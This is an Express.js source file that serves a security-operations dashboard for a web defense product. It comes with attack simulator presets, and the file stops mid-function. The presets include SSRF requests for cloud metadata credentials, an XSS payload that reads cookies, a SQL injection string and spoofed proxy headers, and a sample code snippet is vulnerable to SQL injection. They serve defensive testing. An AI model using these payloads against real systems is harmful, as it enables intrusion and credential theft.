import express from "express";

const router = express.Router();

router.get("/", (req, res) => {
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FORTRESS CLOUD DEFENDER v3.5 | Security Operations Center</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Orbitron:wght@600;800;900&family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #07090e;
      --card-bg: rgba(13, 17, 27, 0.85);
      --card-border: rgba(30, 41, 59, 0.9);
      --primary: #00f0ff;
      --primary-glow: rgba(0, 240, 255, 0.25);
      --accent: #ff0055;
      --accent-glow: rgba(255, 0, 85, 0.25);
      --warning: #ffb800;
      --success: #00ff88;
      --text: #e2e8f0;
      --text-muted: #94a3b8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: 'Plus Jakarta Sans', sans-serif;
      min-height: 100vh;
      background-image: 
        radial-gradient(circle at 15% 15%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
        radial-gradient(circle at 85% 85%, rgba(255, 0, 85, 0.05) 0%, transparent 40%),
        linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
      background-size: 100% 100%, 100% 100%, 40px 40px, 40px 40px;
      padding: 24px;
    }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 24px;
      border-bottom: 1px solid var(--card-border);
      margin-bottom: 28px;
      flex-wrap: wrap;
      gap: 16px;
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 14px;
    }
    .logo-icon {
      width: 44px;
      height: 44px;
      background: linear-gradient(135deg, var(--primary), var(--accent));
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      box-shadow: 0 0 20px var(--primary-glow);
    }
    .logo-text h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 22px;
      font-weight: 800;
      letter-spacing: 1.5px;
      color: #fff;
    }
    .logo-text span {
      font-size: 11px;
      font-family: 'JetBrains Mono', monospace;
      color: var(--primary);
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .badge-group {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }
    .status-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      background: rgba(0, 255, 136, 0.1);
      border: 1px solid rgba(0, 255, 136, 0.3);
      padding: 8px 16px;
      border-radius: 999px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: var(--success);
      box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
    }
    .stealth-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      background: rgba(0, 240, 255, 0.1);
      border: 1px solid rgba(0, 240, 255, 0.3);
      padding: 8px 16px;
      border-radius: 999px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: var(--primary);
    }
    .status-pulse {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: var(--success);
      box-shadow: 0 0 10px var(--success);
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.4; transform: scale(1.3); }
    }
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 16px;
      margin-bottom: 28px;
    }
    .stat-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      padding: 20px;
      border-radius: 14px;
      backdrop-filter: blur(12px);
      position: relative;
      overflow: hidden;
      transition: transform 0.2s, border-color 0.2s;
    }
    .stat-card:hover {
      transform: translateY(-2px);
      border-color: rgba(0, 240, 255, 0.4);
    }
    .stat-label {
      font-size: 12px;
      font-family: 'JetBrains Mono', monospace;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 8px;
    }
    .stat-val {
      font-family: 'Orbitron', sans-serif;
      font-size: 28px;
      font-weight: 800;
      color: #fff;
    }
    .main-grid {
      display: grid;
      grid-template-columns: 1.15fr 0.85fr;
      gap: 24px;
    }
    @media (max-width: 992px) {
      .main-grid { grid-template-columns: 1fr; }
    }
    .panel {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 14px;
      padding: 24px;
      backdrop-filter: blur(12px);
    }
    .panel-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 18px;
      padding-bottom: 12px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    }
    .panel-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 16px;
      font-weight: 700;
      letter-spacing: 0.5px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .tabs {
      display: flex;
      gap: 8px;
      margin-bottom: 18px;
      flex-wrap: wrap;
    }
    .tab-btn {
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid var(--card-border);
      color: var(--text-muted);
      padding: 8px 16px;
      border-radius: 8px;
      cursor: pointer;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      transition: all 0.2s;
    }
    .tab-btn.active, .tab-btn:hover {
      background: rgba(0, 240, 255, 0.1);
      border-color: var(--primary);
      color: var(--primary);
    }
    textarea, input, select {
      width: 100%;
      background: rgba(0, 0, 0, 0.4);
      border: 1px solid var(--card-border);
      border-radius: 8px;
      padding: 12px;
      color: #fff;
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      margin-bottom: 12px;
      resize: vertical;
      transition: border-color 0.2s;
    }
    textarea:focus, input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 10px var(--primary-glow);
    }
    .btn-group {
      display: flex;
      gap: 10px;
      margin-bottom: 16px;
      flex-wrap: wrap;
    }
    .btn {
      background: linear-gradient(135deg, var(--primary), #0077ff);
      color: #000;
      font-family: 'Orbitron', sans-serif;
      font-weight: 800;
      font-size: 13px;
      border: none;
      border-radius: 8px;
      padding: 12px 20px;
      cursor: pointer;
      transition: all 0.2s;
      display: inline-flex;
      align-items: center;
      gap: 8px;
    }
    .btn:hover {
      box-shadow: 0 0 20px var(--primary-glow);
      transform: translateY(-1px);
    }
    .btn-danger {
      background: linear-gradient(135deg, var(--accent), #aa0033);
      color: #fff;
    }
    .preset-btn {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid var(--card-border);
      color: var(--text);
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      padding: 6px 12px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.2s;
    }
    .preset-btn:hover {
      border-color: var(--warning);
      color: var(--warning);
    }
    .result-box {
      background: rgba(0, 0, 0, 0.5);
      border: 1px solid var(--card-border);
      border-radius: 8px;
      padding: 16px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      max-height: 380px;
      overflow-y: auto;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .feed-list {
      display: flex;
      flex-direction: column;
      gap: 10px;
      max-height: 540px;
      overflow-y: auto;
    }
    .feed-item {
      background: rgba(0, 0, 0, 0.3);
      border-left: 4px solid var(--accent);
      border-radius: 6px;
      padding: 12px;
      display: flex;
      flex-direction: column;
      gap: 4px;
      animation: fadeIn 0.3s;
    }
    .feed-item.ALLOW { border-left-color: var(--success); }
    .feed-item.CRITICAL { border-left-color: var(--accent); }
    .feed-item.HIGH { border-left-color: var(--warning); }
    .feed-header {
      display: flex;
      justify-content: space-between;
      font-size: 11px;
      font-family: 'JetBrains Mono', monospace;
    }
    .feed-reason {
      font-size: 13px;
      font-weight: 600;
      color: #fff;
    }
    .tag-vpn {
      display: inline-block;
      background: rgba(255, 0, 85, 0.2);
      border: 1px solid var(--accent);
      color: #fff;
      font-size: 10px;
      padding: 2px 6px;
      border-radius: 4px;
      font-family: 'JetBrains Mono';
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-4px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo">
      <div class="logo-icon">🛡️</div>
      <div class="logo-text">
        <h1>FORTRESS CLOUD DEFENDER</h1>
        <span>v3.5 Enterprise AI & In-Memory Shield</span>
      </div>
    </div>
    <div class="badge-group">
      <div class="stealth-badge">🔒 ZERO SECRETS LEAK POLICY</div>
      <button class="preset-btn" style="border-color: rgba(255, 0, 85, 0.4); color: #ff0055; padding: 6px 14px;" onclick="logoutVault()">🔒 LOCK VAULT</button>
      <div class="status-badge">
        <div class="status-pulse"></div>
        ARMED • GEMINI 2.0 FLASH
      </div>
    </div>
  </div>

  <div class="stats-grid">
    <div class="stat-card">
      <div class="stat-label">Total Requests Audited</div>
      <div class="stat-val" id="stat-total">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Attacks Repelled</div>
      <div class="stat-val" id="stat-blocked" style="color: var(--accent)">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Active IP Auto-Jails</div>
      <div class="stat-val" id="stat-banned" style="color: var(--warning)">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Fast Shield Latency</div>
      <div class="stat-val" style="color: var(--primary)">&lt; 2 ms</div>
    </div>
  </div>

  <div class="main-grid">
    <!-- LEFT: Interactive Testing Console -->
    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">⚡ Interactive Operations & Attack Simulator</div>
      </div>
      <div class="tabs">
        <button class="tab-btn active" onclick="setTab('defend')">1. Cloud API Defender</button>
        <button class="tab-btn" onclick="setTab('handshake')">2. Ephemeral Handshake (Time-Bombed)</button>
        <button class="tab-btn" onclick="setTab('sast')">3. Deep Code SAST</button>
        <button class="tab-btn" onclick="setTab('url')">4. Web Weakness Scanner</button>
        <button class="tab-btn" onclick="setTab('canary')">5. 🍯 Canary Traps</button>
        <button class="tab-btn" onclick="setTab('pow')">6. 🧩 PoW Bot Shield</button>
        <button class="tab-btn" onclick="setTab('patch')">7. 🧬 Virtual Patches</button>
        <button class="tab-btn" onclick="setTab('threat')">8. 🧠 Threat Profiler</button>
        <button class="tab-btn" onclick="setTab('signer')">9. 🛡️ Tamper SDK</button>
        <button class="tab-btn" onclick="setTab('vault')">10. 🔑 Vault Keymaster</button>
        <button class="tab-btn" onclick="setTab('reports')">11. 📊 AI Threat Reports</button>
        <button class="tab-btn" onclick="setTab('payment')">12. 💳 Payment Fortress</button>
      </div>

      <!-- Tab 1: Cloud Defender -->
      <div id="tab-defend">
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">Quick Attack Presets:</div>
        <div class="btn-group">
          <button class="preset-btn" onclick="loadPreset('price')">💰 Price Tampering</button>
          <button class="preset-btn" onclick="loadPreset('ssrf_aws')">☁️ SSRF 169.254.169.254</button>
          <button class="preset-btn" onclick="loadPreset('ssrf_gcp')">🌐 SSRF metadata.google</button>
          <button class="preset-btn" onclick="loadPreset('deception_demo')">🎭 Honeypot Deception</button>
          <button class="preset-btn" onclick="loadPreset('vpn')">🕵️ Simulated VPN/Proxy Attack</button>
          <button class="preset-btn" onclick="loadPreset('xss')">💉 XSS Injection</button>
          <button class="preset-btn" onclick="loadPreset('sqli')">🗄️ SQL Injection</button>
          <button class="preset-btn" onclick="loadPreset('clean')">✅ Clean Request</button>
        </div>
        <textarea id="defend-payload" rows="7" placeholder="Enter JSON payload for /api/defend"></textarea>
        <button class="btn" onclick="runDefend()">🛡️ DEFEND REQUEST (&lt;2ms)</button>
      </div>

      <!-- Tab 2: Ephemeral Handshake (Time-Bombed Admission) -->
      <div id="tab-handshake" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          One-Way Time-Bombed Handshake Portal:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Issues a single-use admission ticket valid for 20s or 60s. If not accepted within the window, the API shuts off access automatically to prevent hackers from curling or probing defense metrics.
        </div>
        <div style="display: flex; gap: 10px; margin-bottom: 12px;">
          <select id="handshake-ttl" style="width: auto;">
            <option value="20">20 Seconds Self-Destruct</option>
            <option value="60" selected>60 Seconds (1 Minute)</option>
          </select>
          <button class="btn" onclick="issueHandshake()">⚡ ISSUE 1-WAY TICKET</button>
        </div>
        <input type="text" id="handshake-token" placeholder="Ticket token will appear here (or paste one to claim)" />
        <button class="btn btn-danger" onclick="claimHandshake()">🔓 CLAIM STATUS & BURN TICKET</button>
      </div>

      <!-- Tab 3: SAST Code Scanner -->
      <div id="tab-sast" style="display: none;">
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">Target Source Code (Zero Secrets Policy Enforced):</div>
        <textarea id="sast-code" rows="9" placeholder="Paste JavaScript/Node.js/Python code to inspect with Gemini 3.8 Flash"></textarea>
        <button class="btn" onclick="runSast()">🤖 AUDIT WITH GEMINI 3.8 FLASH</button>
      </div>

      <!-- Tab 4: URL Weakness Scanner -->
      <div id="tab-url" style="display: none;">
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">Target Web URL:</div>
        <button class="btn" onclick="runUrlScan()">🔍 AUDIT WEB WEAKNESSES</button>
        <button class="btn btn-secondary" style="background: rgba(0, 240, 255, 0.2); border: 1px solid var(--primary); color: var(--primary); margin-top: 8px;" onclick="runZeroVulnAudit()">🏆 CERTIFY ZERO-VULNERABILITY POSTURE</button>
      </div>

      <!-- Tab 5: Canary Honeytokens -->
      <div id="tab-canary" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          Active Canary Honeytokens & Stolen Credential Traps:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Generate tracked bait credentials. If an exfiltrating hacker uses or tests them, the tripwire instantly sounds an emergency breach alarm and auto-jails their IP.
        </div>
        <div class="btn-group">
          <button class="preset-btn" onclick="generateCanary('aws')">🔑 Bait AWS Key</button>
          <button class="preset-btn" onclick="generateCanary('stripe')">💳 Bait Stripe Key</button>
          <button class="preset-btn" onclick="generateCanary('jwt')">🎟️ Bait Admin JWT</button>
          <button class="preset-btn" onclick="generateCanary('database')">🗄️ Bait DB URI</button>
        </div>
        <input type="text" id="canary-input" placeholder="Canary token will appear here" />
        <button class="btn btn-danger" onclick="triggerTripwire()">⚡ SIMULATE ATTACKER TRIPPING WIRE</button>
      </div>

      <!-- Tab 6: Cryptographic Proof-of-Work -->
      <div id="tab-pow" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          Zero-Friction Cryptographic Proof-of-Work (PoW) Shield:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Forces bots & automated scanners to burn CPU solving Hashcash SHA-256 mini-puzzles before requests are admitted. Neutralizes mass curl and DDoS botnets.
        </div>
        <button class="btn" onclick="requestPowChallenge()">🧩 1. GET POW CHALLENGE</button>
        <button class="btn" style="margin-top: 8px;" onclick="solveAndVerifyPow()">⚡ 2. SOLVE IN BROWSER & VERIFY (&lt;20ms)</button>
      </div>

      <!-- Tab 7: Virtual Patching -->
      <div id="tab-patch" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          Autonomous Virtual Patching Engine (Self-Healing Runtime Shield):
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Deploy in-memory virtual hotpatches to neutralize zero-days and identified code vulnerabilities instantly without application redeployment.
        </div>
        <button class="btn" onclick="fetchVirtualPatches()">📋 LIST ACTIVE HOTPATCHES</button>
        <button class="btn btn-danger" style="margin-top: 8px;" onclick="deploySamplePatch()">🧬 DEPLOY SAMPLE HOTPATCH (SQLi ON /catalog)</button>
      </div>

      <!-- Tab 8: Threat Profiler -->
      <div id="tab-threat" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          Autonomous Threat Actor Profiling & MITRE ATT&CK Matrix:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Correlates behavioral cadence, tool entropy, and attack sequences into attacker personas (Script Kiddie vs Targeted Pentester) and MITRE ATT&CK techniques.
        </div>
        <input type="text" id="profiler-ip" value="198.51.100.42" placeholder="Enter IP address to profile" />
        <button class="btn" onclick="fetchDossier()">🧠 COMPILE MITRE ATT&CK DOSSIER</button>
      </div>

      <!-- Tab 9: Client Request Signer -->
      <div id="tab-signer" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          Client-Side Ephemeral Request Signing & Anti-Tamper SDK:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Signs checkout payloads with rotating client HMAC-SHA256 nonces. Detects Burp Suite and DevTools price modifications in 0.05ms.
        </div>
        <button class="btn" onclick="initSigningSession()">🔑 ISSUE CLIENT SIGNING SESSION</button>
        <button class="btn btn-danger" style="margin-top: 8px;" onclick="simulateTamperTest()">🦹 SIMULATE TAMPERED PRICE ATTACK ($1200 -> $1)</button>
      </div>

      <!-- Tab 10: Vault Keymaster -->
      <div id="tab-vault" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          🔑 Vault Access Keymaster & Key Dispenser:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Anyone wanting to use your API must obtain an authorized Vault Key from you. Issue unique keys below, set request quotas, or revoke them at any time.
        </div>

        <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--card-border); border-radius: 8px; padding: 14px; margin-bottom: 14px;">
          <div style="font-size: 12px; font-weight: 700; color: var(--primary); margin-bottom: 10px; font-family: 'JetBrains Mono';">
            + ISSUE NEW CLIENT KEY
          </div>
          <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
            <input type="text" id="new-key-name" placeholder="Client / Friend Name (e.g. Alex)" style="flex: 2; min-width: 140px;" />
            <input type="number" id="new-key-quota" placeholder="Quota" value="1000" style="flex: 1; min-width: 90px;" />
            <select id="new-key-role" style="flex: 1; min-width: 110px;">
              <option value="CLIENT">Client</option>
              <option value="VIP_PARTNER">VIP Partner</option>
            </select>
          </div>
          <button class="btn" onclick="issueVaultKey()">⚡ ISSUE & COPY VAULT KEY</button>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
          <span style="font-size: 12px; font-family: 'JetBrains Mono'; color: var(--text-muted);">ACTIVE CLIENT KEYS:</span>
          <button class="preset-btn" onclick="loadVaultKeys()" style="padding: 4px 8px; font-size: 10px;">🔄 Refresh List</button>
        </div>
        <div id="vault-keys-list" style="font-family: 'JetBrains Mono'; font-size: 11px; max-height: 200px; overflow-y: auto; display: flex; flex-direction: column; gap: 6px;">
          <div style="color: var(--text-muted); padding: 8px;">Click 'Refresh List' to load keys...</div>
        </div>
      </div>

      <!-- Tab 11: AI Threat Intelligence & Scheduled Reports -->
      <div id="tab-reports" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          📊 Autonomous AI Threat Intelligence & Specialized Compliance Audits:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          FORTRESS synthesizes all attacks repelled, honeypot events, and attacker TTPs into CISO-grade intelligence reports and international regulatory compliance audits.
        </div>

        <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px;">
          <button class="preset-btn" onclick="fetchLatestReport()" style="border-color: var(--primary); color: var(--primary);">📋 CISO Threat Digest</button>
          <button class="preset-btn" onclick="fetchPciDssReport()" style="border-color: var(--success); color: var(--success);">💳 PCI-DSS v4.0 Audit</button>
          <button class="preset-btn" onclick="fetchOwaspReport()" style="border-color: var(--warning); color: var(--warning);">🛡️ OWASP API Top 10</button>
          <button class="preset-btn" onclick="fetchThreatActorsReport()" style="border-color: var(--accent); color: var(--accent);">🎯 MITRE ATT&CK Dossier</button>
        </div>

        <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--card-border); border-radius: 8px; padding: 14px; margin-bottom: 14px;">
          <div style="font-size: 12px; font-weight: 700; color: var(--primary); margin-bottom: 10px; font-family: 'JetBrains Mono';">
            ⚙️ AUTOMATED REPORTING SCHEDULE
          </div>
          <div style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center; margin-bottom: 10px;">
            <select id="report-schedule-interval" style="flex: 2; min-width: 180px;">
              <option value="1">Every 1 Hour (Real-Time Vigilance)</option>
              <option value="6">Every 6 Hours</option>
              <option value="12">Every 12 Hours</option>
              <option value="24" selected>Every 24 Hours (Daily Executive CISO Digest)</option>
            </select>
            <button class="preset-btn" onclick="updateReportSchedule()">💾 Save Schedule</button>
            <button class="btn" style="flex: 1; min-width: 200px;" onclick="generateAiReportNow()">🤖 GENERATE AI REPORT NOW</button>
          </div>
          <div style="font-size: 11px; color: #64748b; font-family: 'JetBrains Mono';">
            Dispatches live alerts to Telegram, Slack, and Discord when configured in your environment.
          </div>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
          <span style="font-size: 12px; font-family: 'JetBrains Mono'; color: var(--text-muted);" id="report-panel-label">ACTIVE INTELLIGENCE REPORT:</span>
          <button class="preset-btn" onclick="fetchLatestReport()" style="padding: 4px 8px; font-size: 10px;">🔄 Reload Current</button>
        </div>
        <div id="ai-report-display" style="background: rgba(0,0,0,0.4); border: 1px solid var(--card-border); border-radius: 8px; padding: 14px; font-family: 'JetBrains Mono'; font-size: 11px; max-height: 280px; overflow-y: auto;">
          <div style="color: var(--text-muted);">Select a report above or click 'Generate AI Report Now' to synthesize...</div>
        </div>
      </div>

      <!-- Tab 12: Payment Gateway & Financial Fortress -->
      <div id="tab-payment" style="display: none;">
        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
          💳 Enterprise Payment & Checkout Defense Console:
        </div>
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
          Protects financial flows against Luhn test cards, automated carding bot velocity spikes, fractional-cent (salami slicing) rounding attacks, forged webhook replays, and Magecart form-jackers.
        </div>

        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">Quick Financial Exploit Presets:</div>
        <div class="btn-group">
          <button class="preset-btn" onclick="loadPaymentPreset('carding_bot')">💳 Carding Bot Velocity Spike</button>
          <button class="preset-btn" onclick="loadPaymentPreset('fractional_cent')">🪙 Fractional Cent ($0.0001)</button>
          <button class="preset-btn" onclick="loadPaymentPreset('currency_switch')">💵 Currency Arbitrage (JPY -> USD)</button>
          <button class="preset-btn" onclick="loadPaymentPreset('magecart')">🕵️ Magecart Web-Skimmer Code</button>
          <button class="preset-btn" onclick="loadPaymentPreset('fake_webhook')">🪝 Forged Unsigned Stripe Webhook</button>
        </div>

        <textarea id="payment-payload" rows="6" placeholder="Enter transaction JSON or JavaScript to audit..."></textarea>
        
        <div class="btn-group">
          <button class="btn" onclick="runPaymentAudit()">⚡ RUN FINANCIAL AUDIT</button>
          <button class="btn btn-secondary" onclick="runMagecartAudit()" style="background: rgba(255,184,0,0.2); border: 1px solid var(--warning); color: var(--warning);">🕵️ AUDIT FOR MAGECART SKIMMER</button>
          <button class="preset-btn" onclick="loadPaymentTelemetry()">📊 Payment Telemetry</button>
        </div>
      </div>

      <div style="margin-top: 18px; font-size: 12px; font-family: 'JetBrains Mono'; color: var(--primary);">
        DEFENSE VERDICT:
      </div>
      <div class="result-box" id="result-box">Waiting for simulation input...</div>
    </div>

    <!-- RIGHT: Real-Time Threat Intel Feed -->
    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">🚨 Real-Time Security Operations Feed</div>
        <span style="font-size: 11px; font-family: 'JetBrains Mono'; color: var(--text-muted);">AUTO-REFRESHING</span>
      </div>
      <div class="feed-list" id="feed-list">
        <div style="color: var(--text-muted); font-size: 12px; font-family: 'JetBrains Mono';">Listening for incoming threats...</div>
      </div>
    </div>
  </div>

  <script>
    let currentTab = 'defend';

    function setTab(tab) {
      currentTab = tab;
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      event.target.classList.add('active');
      document.getElementById('tab-defend').style.display = tab === 'defend' ? 'block' : 'none';
      document.getElementById('tab-handshake').style.display = tab === 'handshake' ? 'block' : 'none';
      document.getElementById('tab-sast').style.display = tab === 'sast' ? 'block' : 'none';
      document.getElementById('tab-url').style.display = tab === 'url' ? 'block' : 'none';
      document.getElementById('tab-canary').style.display = tab === 'canary' ? 'block' : 'none';
      document.getElementById('tab-pow').style.display = tab === 'pow' ? 'block' : 'none';
      document.getElementById('tab-patch').style.display = tab === 'patch' ? 'block' : 'none';
      document.getElementById('tab-threat').style.display = tab === 'threat' ? 'block' : 'none';
      document.getElementById('tab-signer').style.display = tab === 'signer' ? 'block' : 'none';
      document.getElementById('tab-vault').style.display = tab === 'vault' ? 'block' : 'none';
      document.getElementById('tab-reports').style.display = tab === 'reports' ? 'block' : 'none';
      document.getElementById('tab-payment').style.display = tab === 'payment' ? 'block' : 'none';
      if (tab === 'vault') loadVaultKeys();
      if (tab === 'reports') fetchLatestReport();
      if (tab === 'payment') loadPaymentPreset('carding_bot');
    }

    const presets = {
      price: { path: "/api/checkout", method: "POST", body: { productId: "item_99", total: 0.99 } },
      ssrf_aws: { 
        path: "/api/proxy", 
        method: "POST", 
        headers: { "user-agent": "curl/7.88.1", "x-forwarded-for": "198.51.100.42", "x-forwarded-port": "49152" },
        body: { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" } 
      },
      ssrf_gcp: { 
        path: "/api/fetch-data", 
        method: "POST", 
        headers: { "user-agent": "python-requests/2.31.0", "x-forwarded-for": "203.0.113.88", "x-forwarded-port": "54321" },
        body: { url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" } 
      },
      deception_demo: {
        path: "/api/orders/pay",
        method: "POST",
        body: { orderId: "ORD-999", amount: 0.01 },
        mode: "DECEPTION"
      },
      vpn: { 
        path: "/api/login", 
        method: "POST", 
        headers: { "via": "1.1 anonymizer.proxy", "x-forwarded-for": "185.220.101.5, 10.0.0.1", "x-tor-exit-node": "yes" },
        body: { username: "admin", password: "test_password" } 
      },
      xss: { path: "/api/profile", method: "POST", body: { bio: "<script>alert(document.cookie)</script>" } },
      sqli: { path: "/api/users", method: "POST", body: { username: "admin' OR '1'='1" } },
      clean: { path: "/api/orders", method: "POST", body: { itemId: "item_123", quantity: 2 } }
    };

    function loadPreset(key) {
      document.getElementById('defend-payload').value = JSON.stringify(presets[key], null, 2);
    }
    loadPreset('price');

    document.getElementById('sast-code').value = 'app.post("/api/pay", (req, res) => {\\n  const charge = req.body.price;\\n  db.query("SELECT * FROM cards WHERE id = " + req.body.cardId);\\n});';

    async function runDefend() {
      const box = document.getElementById('result-box');
      box.textContent = "Analyzing through Fortress Layers...";
      try {
        const payload = JSON.parse(document.getElementById('defend-payload').value);
        const res = await fetch('/api/defend', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        fetchMetrics();
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function issueHandshake() {
      const box = document.getElementById('result-box');
      const ttl = document.getElementById('handshake-ttl').value;
      box.textContent = "Generating single-use time-bombed ticket...";
      try {
        const res = await fetch('/api/admin/handshake/issue', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ttl_seconds: ttl })
        });
        const data = await res.json();
        document.getElementById('handshake-token').value = data.token;
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function claimHandshake() {
      const box = document.getElementById('result-box');
      const token = document.getElementById('handshake-token').value;
      if (!token) return alert('Enter or issue a token first!');
      box.textContent = "Verifying and burning single-use token...";
      try {
        const res = await fetch('/api/admin/handshake/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        document.getElementById('handshake-token').value = '';
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function runSast() {
      const box = document.getElementById('result-box');
      box.textContent = "Dispatching to Gemini 3.8 Flash Neural Engine...";
      try {
        const code = document.getElementById('sast-code').value;
        const res = await fetch('/api/scan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename: "controller.js", type: "express_handler", code })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
        fetchMetrics();
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function runUrlScan() {
      const box = document.getElementById('result-box');
      box.textContent = "Probing target URL headers and security configuration...";
      try {
        const url = document.getElementById('target-url').value;
        const res = await fetch('/api/inspect-url', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function runZeroVulnAudit() {
      const box = document.getElementById('result-box');
      box.textContent = "Executing 360-degree Zero-Vulnerability Compliance Audit on target URL...";
      try {
        const url = document.getElementById('target-url').value;
        const res = await fetch('/api/inspect-url/zero-vuln', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url })
        });
        const data = await res.json();
        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = "Error: " + err.message;
      }
    }

    async function generateCanary(type) {
      const box = document.getElementById('result-box');
      box.textContent = "Generating tracked Canary Honeytoken for type: " + type + "...";
      try {
